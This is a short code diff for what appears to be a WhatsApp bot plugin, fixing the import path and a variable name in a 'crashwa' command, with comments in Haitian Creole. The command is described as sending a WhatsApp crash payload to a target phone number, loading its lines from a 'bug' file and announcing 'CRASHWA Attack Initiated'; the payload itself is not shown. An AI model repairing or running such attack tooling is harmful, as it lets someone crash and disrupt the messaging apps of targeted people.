@@ -1,6 +1,7 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../../bug/izuka5.js');
+const bugchat = require('../bug/izuka5.js'); // Bon chemen ak non
+
 cmd({
   pattern: 'crashwa',
   desc: 'Owner-only command to send WhatsApp crash payload to target',
@@ -45,7 +46,7 @@ cmd({
     }
 
     const targetJid = `${targetNumber}@s.whatsapp.net`;
-    const crashLines = izuka5.split('\n').filter(Boolean);
+    const crashLines = bugchat.split('\n').filter(Boolean); // ⚠️ Te gen izuka5 la isit — korije li
 
     await bot.sendMessage(from, {
       text: `💣 *CRASHWA Attack Initiated*\n📱 Target: +${targetNumber}\n📦 Payload: ${crashLines.length} lines\n\n⚠️ Wait while the attack is sent...`
